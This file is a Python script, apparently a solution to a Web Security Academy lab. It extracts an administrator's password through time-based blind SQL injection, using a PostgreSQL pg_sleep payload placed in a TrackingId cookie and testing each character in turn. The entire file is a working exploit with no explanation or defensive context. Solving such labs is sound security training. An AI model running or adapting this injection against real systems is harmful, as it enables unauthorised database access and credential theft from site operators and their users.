import requests
import string
import time

url = "https://0aa6006e034827ad81e1cb28006b0069.web-security-academy.net/"
admin_password = ''
password_chars = string.ascii_lowercase + string.digits + '~!@#$%^&*()+-/'

for i in range(1, 21):
    found_char = None
    for j in password_chars:
        payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{j}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        cookies = {"TrackingId": payload}
        start_time = time.time()
        response = requests.get(url, cookies=cookies, timeout=15)
        end_time = time.time()
        if end_time - start_time >= 10:
            found_char = j
            break
        
    if found_char:
        admin_password += found_char
        print(f"{i}, character {found_char}")

print('Administrator password: ' + admin_password)
